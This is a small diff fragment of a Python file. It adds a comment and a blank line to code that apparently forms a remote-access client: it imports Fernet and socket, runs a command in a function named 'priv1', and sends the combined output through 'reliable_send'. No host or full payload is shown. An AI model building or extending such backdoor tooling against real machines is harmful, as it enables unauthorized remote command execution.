@@ -1,3 +1,4 @@
+#justheader
 from cryptography.fernet import Fernet
 import base64
 import socket
@@ -32,6 +33,7 @@ def priv1():
     result = execute.stdout + execute.stderr
     result = result.decode()
     reliable_send(result)
+
 
     
 def priv2():
